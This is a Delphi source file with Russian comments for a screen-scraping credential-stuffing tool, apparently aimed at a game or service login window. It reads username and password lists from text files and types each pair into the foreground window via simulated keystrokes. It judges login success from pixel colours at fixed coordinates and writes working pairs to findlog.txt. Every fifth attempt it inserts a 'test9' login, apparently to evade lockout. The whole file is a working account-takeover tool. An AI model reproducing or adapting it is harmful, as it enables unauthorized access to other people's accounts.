unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Label1: TLabel;
    Label2: TLabel;
    CheckBox1: TCheckBox;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    Label12: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
      procedure WMHotkey( var msg: TWMHotkey ); message WM_HOTKEY;
    { Private declarations }
  public
    { Public declarations }
  end;

  tcord = class(tthread)
private
{ private declarations }
protected

procedure execute; override;
end;


 type tpix = record
  r:integer;
  g:integer;
  b:integer;
 end;

var
  Form1: TForm1;
  DC:HDC;
  WND:HWND;
  h:HWND;
  start: Boolean;
  pname,ppass,findlog:TextFile;
  sname,spass:string;
  cord:tcord;

implementation
{tcord}
function gp2(x,y,r,g,b:integer):boolean;
begin
 if (GetRValue(GetPixel(DC,x,y))=r) and
    (GetGValue(GetPixel(DC,x,y))=g) and
    (GetBValue(GetPixel(DC,x,y))=b) then gp2:=True
    else gp2:=false;

end;

procedure tcord.execute;
var P:TPoint;
begin
  while start do
  begin
   if gp2(299,288,24,44,49) then
   form1.Label1.Caption:='Вводим имя и пароль' else

    if gp2(343,270,0,0,0) then
    form1.Label1.Caption:='Нет такого акка' else

    if gp2(319,232,0,0,0) then
    form1.Label1.Caption:='Не верный пароль' else

    if gp2(331,233,0,0,0) then
    form1.Label1.Caption:='Не Удалось соединиться!' else

    if gp2(395,270,206,222,255) then
    form1.Label1.Caption:='Мы вошли!' else
  form1.Label1.Caption:='Не пойму че за хрень ваще';

  GetCursorPos(p);
  form1.Label3.Caption:=IntToStr(p.x);
  form1.Label4.Caption:=IntToStr(p.y);
  form1.Label5.Caption:=IntToStr(GetRValue(GetPixel(DC,p.x,p.y)));
  form1.Label6.Caption:=IntToStr(GetGValue(GetPixel(DC,p.x,p.y)));
  form1.Label7.Caption:=IntToStr(GetBValue(GetPixel(DC,p.x,p.y)));
  Sleep(50);
  end;
  end;

{$R *.dfm}
function gp(x,y,r,g,b:integer):boolean;
begin
 if (GetRValue(GetPixel(DC,x,y))=r) and
    (GetGValue(GetPixel(DC,x,y))=g) and
    (GetBValue(GetPixel(DC,x,y))=b) then gp:=True
    else gp:=false;

end;

procedure openfiles;
begin
   // Открываем фалы с именами и паролями
 try
 AssignFile(pname,'login.txt');
 Reset(pname);
 except
   ShowMessage('Не могу открыть login.txt!');
   Application.Terminate;
   end;

 try
 AssignFile(ppass,'pass.txt');
 Reset(ppass);
 except
   ShowMessage('Не могу открыть pass.txt!');
   Application.Terminate;
   end;

   // Создаем файл для найденных комбинаций
   AssignFile(findlog,'findlog.txt');
   if FileExists('findlog.txt') then Append(findlog) else Rewrite(findlog);
  end;

procedure closefiles;
begin
 try
   CloseFile(pname);
   CloseFile(ppass);
   CloseFile(findlog);
   except
     end;
end;

procedure process;
var
i,k:Integer;
c:Char;
begin
  k:=0;
 //Открываем файлы
 openfiles;
  try
   CloseFile(findlog);
   except
     end;
 // Основной цикл
 while (not Eof(pname)) and (not Eof(ppass)) and Form1.CheckBox1.Checked do
 begin
   if gp2(299,288,24,44,49) then
      begin
       if Form1.CheckBox2.Checked and (k mod 5 =1) then
       begin
           PostMessage(h, WM_CHAR, Ord('t'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('e'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('s'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('t'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('9'), 0);
           sleep(50);

       // Переходим на поле пароля
         PostMessage(h,WM_KEYDOWN,vk_Tab,0);
         sleep(50);
         PostMessage(h,WM_KEYUP,vk_Tab,0);

           PostMessage(h, WM_CHAR, Ord('t'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('e'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('s'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('t'), 0);
           sleep(50);
           PostMessage(h, WM_CHAR, Ord('9'), 0);
           Sleep(50);
                 // Жмем Enter
        PostMessage(h,WM_KEYDOWN,VK_RETURN,0);
        sleep(50);
        PostMessage(h,WM_KEYUP,VK_RETURN,0);
         Sleep(2000);
              SetCursorPos(435,425);
        mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
        sleep(50);
        mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
        Sleep(5000);
        k:=k+1;
        continue;
         end;


      Readln(pname,sname);
      Readln(ppass,spass);
      if Form1.CheckBox3.Checked then sname:=sname+'2';
      if Form1.CheckBox4.Checked then sname:=sname+'1';
      Form1.Label11.Caption:=sname;
      Form1.Label12.Caption:=spass;
      // Надо вводить имя и пароль
       // Вводим имя
       for i:=1 to Length(sname) do
          begin
           c:=sname[i];
           PostMessage(h, WM_CHAR, Ord(c), 0);
           sleep(50);
          end;
       // Переходим на поле пароля
         PostMessage(h,WM_KEYDOWN,vk_Tab,0);
         sleep(50);
         PostMessage(h,WM_KEYUP,vk_Tab,0);
       // Вводим пароль
        for i:=1 to Length(spass) do
          begin
           c:=spass[i];
           PostMessage(h, WM_CHAR, Ord(c), 0);
           sleep(50);
          end;
      // Жмем Enter
        PostMessage(h,WM_KEYDOWN,VK_RETURN,0);
        sleep(50);
        PostMessage(h,WM_KEYUP,VK_RETURN,0);
       k:=k+1;
      end;
    Sleep(2000);

       // Если не удалось соединиться
   if gp2(331,233,0,0,0) then
   begin
    PostMessage(h,WM_KEYDOWN,VK_RETURN,0);
    sleep(10);
    PostMessage(h,WM_KEYUP,VK_RETURN,0);

      form1.Label14.Caption:=IntToStr(k);
      Application.ProcessMessages;
      Sleep(5000);
    continue;
    end;

           // Если Ждем
   if gp2(243,253,0,0,0) then
   begin
    sleep(1000);
    end;

         // Если Ждем
   if gp2(243,253,0,0,0) then
   begin
    sleep(5000);
    end;

     // Если нет акка
    if gp2(343,270,0,0,0) then
    begin
         PostMessage(h,WM_KEYDOWN,VK_RETURN,0);
        sleep(50);
        PostMessage(h,WM_KEYUP,VK_RETURN,0);

      form1.Label14.Caption:=IntToStr(k);
      Application.ProcessMessages;
      Sleep(5000);
    continue;
      end;

    // Не верный пароль
    if gp2(319,232,0,0,0) then
    begin
              // Создаем файл для найденных комбинаций
       AssignFile(findlog,'findlog.txt');
       if FileExists('findlog.txt') then Append(findlog) else Rewrite(findlog);

     Writeln(findlog,sname+' пароль не подходит ');
     PostMessage(h,WM_KEYDOWN,VK_RETURN,0);
     sleep(50);
     PostMessage(h,WM_KEYUP,VK_RETURN,0);

      form1.Label14.Caption:=IntToStr(k);
      Application.ProcessMessages;
      CloseFile(findlog);
      Sleep(5000);
    continue;
    end;

   // Если Вошли
   if gp2(395,270,206,222,255) then
   begin

             // Создаем файл для найденных комбинаций
       AssignFile(findlog,'findlog.txt');
       if FileExists('findlog.txt') then Append(findlog) else Rewrite(findlog);
       
     Writeln(findlog,sname+'  '+spass);
     SetCursorPos(435,425);
     Sleep(5000);
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    sleep(50);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

      form1.Label14.Caption:=IntToStr(k);
      Application.ProcessMessages;
    //  ShowMessage('Нашли пару: '+sname+' '+spass);
    CloseFile(findlog);
     Sleep(5000);
    continue;
   end;


 end;
// закрываем файлы
closefiles;
end;


procedure TForm1.WMHotkey( var msg: TWMHotkey );
 begin
  if msg.hotkey = 1 then
      h:=GetForegroundWindow;
     SetWindowPos(h,HWND_TOP,-3,-3,0,0,SWP_NOSIZE);

     WND:=GetForegroundWindow; //???????? ?????????? ????????? ????
     DC:=Windows.GetWindowDC(WND); //???????? ?????????? ????????? ????
     if start then
      if not CheckBox1.Checked then
      CheckBox1.Checked:=true else
      CheckBox1.Checked:=False;

     if CheckBox1.Checked then process;

   end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 if not RegisterHotkey(Handle, 1, MOD_ALT, VK_F1) then
  ShowMessage('Unable to assign Alt-F1 as hotkey.');

end;

procedure TForm1.Button1Click(Sender: TObject);
begin
   // Выключатели
 if not start then
 begin
 Button1.Caption:='Выключить';
 Label2.Caption:='Включено!';
 Label2.Font.Color:=clGreen;
 start:=true;
 end
 else
 begin
 Button1.Caption:='Поехали';
 Label2.Caption:='Выключено';
 Label2.Font.Color:=clRed;
 start:=false;
 end;

if start then
begin
cord:= tcord.create(true);
cord.freeonterminate := true;
cord.priority := tplower;
cord.resume;
 end else
 begin
  cord.Terminate;
   end;

  end;

end.
